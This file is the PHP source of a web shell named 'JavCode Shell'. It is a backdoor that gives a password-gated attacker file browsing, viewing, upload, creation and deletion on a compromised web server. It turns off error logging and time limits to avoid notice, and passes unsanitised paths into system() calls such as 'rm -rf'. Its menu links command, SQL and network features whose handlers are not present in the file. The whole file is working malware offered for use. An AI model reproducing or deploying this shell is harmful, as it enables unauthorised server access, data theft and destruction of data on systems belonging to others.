<?php
/*
JavCode Shell 

@ shutdown57 - milio48 - bL@cKID

*/

$j_debug		= FALSE;
$j_encrypted	= TRUE; // Akan mengenskripsi setiap gerakan ;'v
$j_password		= "f1290186a5d0b1ceab27f4e77c0c5d68"; // default password : w
$j_gethost		= $_SERVER['HTTP_HOST'];
$j_judul		= "JavCode Shell - ".$j_gethost;

Class JavCode{
public function __construct(){
	@session_start();
	if($GLOBALS['j_debug'] === TRUE){
		error_reporting(E_ALL);
	}else{
		error_reporting(0);
	}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if (!isset($_SESSION[md5('javcode')]))
	{
	if (empty($GLOBALS['j_password']) || (isset($_POST['j_password']) && (md5($_POST['j_password'])) == $GLOBALS['j_password']))
		{
		$_SESSION[md5('javcode')] = true;
		}
	  else
		{
		echo '<form method="POST"><input type="text" placeholder="JavCode shell" name="j_password">';
		echo '<input type="submit" value=">>"></form>';
		exit;
		}
	}

}
public function safemode()
{
	if(ini_get('safe_mode') == 'on')
	{
		return '<font color=red>ON</font>';
	}else{
		return '<font color=green>OFF</font>';
	}
}
public function phpinfos()
{
	return phpversion().' | < <a href="">PHPINFO</a> > ';
}
public function gethdd($s){
	if($s>=1073741824)return sprintf('%1.2f',$s/1073741824).' GB';elseif($s>=1048576)return sprintf('%1.2f',$s/1048576).' MB';elseif($s>=1024)return sprintf('%1.2f',$s/1024).' KB';else return $s.' B';
}
 public function viewfile($f){$file=wordwrap(file_get_contents($f),150,"\n",true);
 $a=highlight_string($file,true);
 $old=array("0000BB","000000","FF8000","DD0000","007700");
 $new=array("0000BB","333333","111111","999999","ff0000");
 $a=str_ireplace($old,$new,$a);$result="<div class=\"code\">";$result.=$a;$result.="</div>";return $result;
}
}
Class J_html{
	public function Head($content)
	{
		$h = "<html><head>";
		$h.= "<meta name=\"author\" content=\"shutdown57 (JavCode)\">";
		$h.= "<title>".$content[0]."</title>";
		if(is_array($content[1]))
		{
			foreach($content[1] as $type=>$link)
			{
				$h.= "<link rel=\"".$type."\" href=\"".$link."\" >";
			}
		}
		$h.= "</head>";
		return $h;
	}
	public function j_print($content)
	{
		return print($content);
	}
	public function table($th=NULL,$tr=NULL,$open=TRUE,$close=FALSE)
	{
		$j = "";
		if($open == TRUE){
		$j.= "<table class=\"table-javcode\">";
		}
		if($th){
			foreach($th as $t){
				$j.= "<th>".$t."</th>";
			}
		}
		if($tr)
		{
			$j.="<tr>";
			foreach($tr as $y)
			{
				$j.="<td>";
				$j.=$y;
				$j."</td>";
			}
			$j.="</tr>";
		}
		if($close == TRUE){
		$j.= "</table>";
		}
		return $j;
	}
	public function td($c)
	{
		$b ="<td>";
		$b.=$c;
		$b.="</td>";
		return $b;
	}
	public function tr($a)
	{
		$c ="<tr>";
		$c.=$a;
		$c.="</tr>";
		return $c;
	}
	public function a($href,$blank = FALSE,$ap)
	{
		$f = "<a href=\"".$href."\"";
		if($blank == TRUE)
		{
			$f.= "target=\"_blank\"";
		}
		$f.= ">".$ap;
		$f.= "</a>";
		return $f;
	}
	public function j_act($c)
	{
	if(is_array($c))
	{
		$a = "[ ";
		foreach($c as $d=>$f)
		{
			$a.= " ".$this->a($d,'',$f)." ";  
		}
		$a.= " ]";
	}
	return $a;	
	}
	public function limenu($fz,$gansw)
	{
		$li = "<li>";
		$li.= $this->a($fz,'',$gansw);
		$li.="</li>";
		return $li;
	}
	public function input($type,$name,$value,$attr=NULL)
	{
		$i = "<input type=\"".$type."\"";
		$i.= "  name=\"".$name."\"";
		$i.= "  value=\"".$value."\"";
		if(is_array($attr)){
			foreach($attr as $atr=>$val)
			{
				$i.= "  ".$atr."=\"".$val."\"";
			}
		}
		$i.= ">";
		return $i;
	}
	public function j_notif($text)
	{
		$j = "<div class=\"j_notif\" onclick=\"document.getElementById('j_notif').style.display='none';\"  id=\"j_notif\">";
		$j.= "<span onclick=\"document.getElementById('j_notif').style.display='none';\" > X </span>";
		$j.= $text;
		$j.= "</div>";
		return $j;
	}
}
Class J_fileman{
	public function Fz($s,$decrypt = FALSE)
	{
		if($decrypt == TRUE)
		{
			return base64_decode($s);
		}
		if($GLOBALS['j_encrypted'] == TRUE)
		{
			return base64_encode($s);
		}else{
			return $s;
		}
	}
	public function yw($s)
	{
		return base64_decode($s);
	}
	public function GetDir()
	{
		if(empty($_GET['j']))
		{
			$j = getcwd();
		}else{
			$j = $this->Fz($_GET['j'],$GLOBALS['j_encrypted']);
		}
		return $j;
	}
	public function ListDir($dir)
	{
		if(function_exists('scandir'))
		{
			$s= scandir($dir);
		}else{
			$s= system('ls -lah '.$dir); 
		}
		return $s;
	}
	public function j_link($link){
		$g = "<a href=\"".$link[0];
		$g.= $this->Fz($link[1]).$link[2];
		$g.= $this->Fz($link[3]).$link[4]."\" target=\"".$link[5]."\"";
		$g.= ">".$link[6]."</a>";
		return $g;
	}
	public function GetSize($files)
	{
		$size=filesize($files)/1024;
		$size=round($size,3);
		if($size>1024){$size=round($size/1024,2).'MB';}else {$size=$size.'KB';}
		return $size;
	}
	public function GetPerms($file)
	{
		$perms=fileperms($file);if(($perms&0xC000)==0xC000){$info='s';}elseif(($perms&0xA000)==0xA000){$info='l';}elseif(($perms&0x8000)==0x8000){$info='-';}elseif(($perms&0x6000)==0x6000){$info='b';}elseif(($perms&0x4000)==0x4000){$info='d';}elseif(($perms&0x2000)==0x2000){$info='c';}elseif(($perms&0x1000)==0x1000){$info='p';}else {$info='u';}$info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');$info.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));$info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');$info.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));$info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');$info.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));return $info;
	}
	public function GetType($file)
	{
		if(function_exists('mime_content_type')){if(is_readable($file)){$mime=mime_content_type($file);}else {$mime="Unknown";}}else {if(is_dir($file)){$mime="Directory";}elseif(is_file($file)){$mime="Files";}else {$mime="Unknown";}}return $mime;
	}
	public function GetOwner($path)
	{
		if(function_exists('posix_getpwuid')){$downer=@posix_getpwuid(fileowner($path));$downer=$downer['name'];}else {$downer=fileowner($path);}return $downer;
	}
	public function GetGroup($path)
	{
		if(function_exists('posix_getgrgid')){$dgrp=@posix_getgrgid(filegroup($path));$dgrp=$dgrp['name'];}else {$dgrp=filegroup($path);}return $dgrp;
	}
	public function GetLmod($f)
	{
		$a_fdm=@date("Y-m-d H:i:s",filemtime($f));return $a_fdm;
	}
	public function r($dmn)
	{
		echo "<meta http-equiv='refresh' content='0;url=".$dmn."'>";
	}
	public function j_touch($filepath)
	{
		if(function_exists('touch'))
		{
			return touch($filepath);
		}elseif(function_exists('fopen') && function_exists('fwrite'))
		{
			$fp = fopen($filepath,'w');
			return fwrite($fp,'# JavCode Shell 2017 | shutdown57');
			fclose($fp);
		}else{
			return file_put_contents($filepath,'# JavCode Shell 2017 | shutdown57');
		}
	}
	public function j_mkdir($filepath){
		return mkdir($filepath);
	}
	public function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach($s as $ss){if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm=unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}
}


$javcode = new JavCode();
$j_html = new J_html();
$j_film = new J_fileman();
$num	= 1;

$getdir = $j_film->GetDir();
$scndir = $j_film->ListDir($getdir);
$j_html->j_print($j_html->Head(
	array($GLOBALS['j_judul'],
	array('icon' => 'https://raw.githubusercontent.com/alintamvanz/alintamvanz.github.io/master/images/favicon_1945.gif',
		  'stylesheet' => 'http://alintamvanz.github.io/css/kekw.css'))));
?>
<script type="text/javascript">
	function j_show(id){
		document.getElementById(id).style.right=0;
	}
function j_check(source) {
  checkboxes = document.getElementsByName('files[]');
  for(var i=0, n=checkboxes.length;i<n;i++) {
    checkboxes[i].checked = source.checked;
  	}
	}
  function j_close(close)
  {
  	document.getElementsById(close).style.display='none';
  }
  function j_jsfile(){
  	var j=prompt('Newfile :<?=$getdir; ?>');
  	if(j != null){
  	window.location.href='?j=<?=$j_film->Fz($getdir);?>&n='+j+'&a=touch';
    }
  }
  function j_jsdir(){
  	var j=prompt('New Directory : <?=$getdir;?>');
  	if(j != null){
  		window.location.href='?j=<?=$j_film->Fz($getdir);?>&n='+j+'&a=mkdir';
  	}
  }
</script>
<?php
$serverinfo = array('System :' => php_uname().'<br>',
					'Hostname : ' => $GLOBALS['j_gethost']." | Safe Mode : ".$javcode->safemode().'<br>',
					'Software : ' => $_SERVER['SERVER_SOFTWARE'].'<br>',
					'PHP Version : ' => $javcode->phpinfos().' | ',
					'HDD : '=> $javcode->gethdd(disk_total_space($getdir))-$javcode->gethdd(disk_free_space($getdir)),
					'/' => $javcode->gethdd(disk_total_space($getdir)),
					' | Free : ' => $javcode->gethdd(disk_free_space($getdir)));
$j_html->j_print('<div class="header-info">');
foreach($serverinfo as $info=>$val)
{
	echo $info.$val;
}
$j_html->j_print('</div>');
$j_html->j_print("<ul class=\"menu\">");
$menu = array('Home' => '?',
			 'Upload' => 'javascript:j_show(\'upload\')',
			 'PHP' => '?a=php',
			 'Command' => '?a=cmd',
			 'SQL' => '?a=sql',
			 'PS' => '?a=ps',
			 'String' => '?a=str',
			 'Network' => '?a=net',
			 'NewFile' => 'javascript:j_jsfile();',
			 'LogOut' => '?a=logOUT'
			  );
foreach($menu as $m => $l)
{
	$j_html->j_print($j_html->limenu($l,$m));
}
$j_html->j_print("</ul>");
$j_html->j_print("<div class='upload' id='upload'>");
$j_html->j_print("<form method='POST' enctype='multipart/form-data'>");
$j_html->j_print($j_html->input('file','fupload','').$j_html->input('submit','','>>'));
$j_html->j_print("</form></div>");
if(isset($_FILES['fupload']['tmp_name']))
{
	if(@copy($_FILES['fupload']['tmp_name'],$getdir.'/'.$_FILES['fupload']['name'])){
		$j_html->j_print($j_html->j_notif('Upload Successfully !'));
	}
}
if(empty($_GET['a'])){

$j_html->j_print($j_html->table(array('No','-','Files','Size','Type','Date Modif','Owner:Group','Permission','Actions')));
$act1=array("javascript:j_jsfile();"=>"new file","javascript:j_jsdir();"=>"new dir");
$j_html->j_print($j_html->tr($j_html->td('*').$j_html->td($j_html->input('checkbox','files','',array('onclick' => 'j_check(this);'))).$j_html->td($j_film->j_link(array('?j=',dirname($getdir),'','','','','<< Parent Directory'))).$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td($j_html->j_act($act1))));
foreach($scndir as $dir)
{if(!is_dir($getdir.'/'.$dir)|| $dir == '.'||$dir == '..')continue;
$ll = '?j='.$j_film->Fz($getdir.'/'.$dir).'&a=';
$act = array($ll.'ren' => 'ren',$ll.'del' => 'del');
	$j_html->j_print($j_html->tr(
		$j_html->td($num++).
		$j_html->td($j_html->input('checkbox','files[]',$getdir.'/'.$dir)).
		$j_html->td('['.$j_film->j_link(array('?j=',$getdir.'/'.$dir,'','','','',$dir)).']').
		$j_html->td($j_film->GetSize($getdir.'/'.$dir)).
		$j_html->td($j_film->GetType($getdir.'/'.$dir)).
		$j_html->td($j_film->GetLmod($getdir.'/'.$dir)).
		$j_html->td($j_film->GetOwner($getdir.'/'.$dir).':'.$j_film->GetGroup($getdir.'/'.$dir)).
		$j_html->td($j_film->GetPerms($getdir.'/'.$dir)).
		$j_html->td($j_html->j_act($act))));
}
foreach($scndir as $fil)
{if(!is_file($getdir.'/'.$fil)|| $fil == '.' || $fil == '..')continue;
$ll ='?j='.$j_film->Fz($getdir).'&f='.$j_film->Fz($fil).'&a=';
$act = array($ll.'ren' => 'ren',$ll.'edit' => 'edit',$ll.'del' => 'del',$ll.'dl' => 'dl');
	$j_html->j_print($j_html->tr(
		$j_html->td($num++).
		$j_html->td($j_html->input('checkbox','files[]',$getdir.'/'.$fil)).
		$j_html->td($j_film->j_link(array('?j=',dirname($getdir.'/'.$fil),'&f=',$fil,'&a=view','_blank',$fil))).
		$j_html->td($j_film->GetSize($getdir.'/'.$fil)).
		$j_html->td($j_film->GetType($getdir.'/'.$fil)).
		$j_html->td($j_film->GetLmod($getdir.'/'.$fil)).
		$j_html->td($j_film->GetOwner($getdir.'/'.$fil).':'.$j_film->GetGroup($getdir.'/'.$fil)).
		$j_html->td($j_film->GetPerms($getdir.'/'.$fil)).
		$j_html->td($j_html->j_act($act))));
}
$j_html->j_print($j_html->table('','',FALSE,TRUE));

}else{
$a = @$_GET['a'];
$f = @$_GET['f'];
$j = @$_GET['j'];
if($a == 'view')
{
	$j_html->j_print($javcode->viewfile($j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$j_film->Fz($f,$GLOBALS['j_encrypted'])));
}elseif($a == 'logOUT'){
		session_destroy();
	$j_html->j_print("<script>alert('Bye ~~');location.href='?'</script>");
}elseif($a == 'touch'){
	if($j_film->j_touch($j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$_GET['n'])){
		$j_film->r('?j='.$j);
	}else{
		$j_film->r('?j='.$j);
	}
}elseif($a == 'mkdir'){
	if($j_film->j_mkdir($j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$_GET['n'])){
		$j_film->r('?j='.$j);
	}else{
		$j_film->r('?j='.$j);
	}
}elseif($a == 'del'){
	$deletef = (!empty($f)) ? $j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$j_film->Fz($f,$GLOBALS['j_encrypted']) : $j_film->Fz($j,$GLOBALS['j_encrypted']);
	if($j_film->delete($deletef))
	{
		$j_film->r('?j='.$j);
	}else{
		$j_film->r('?j='.$j);
	}
}
}
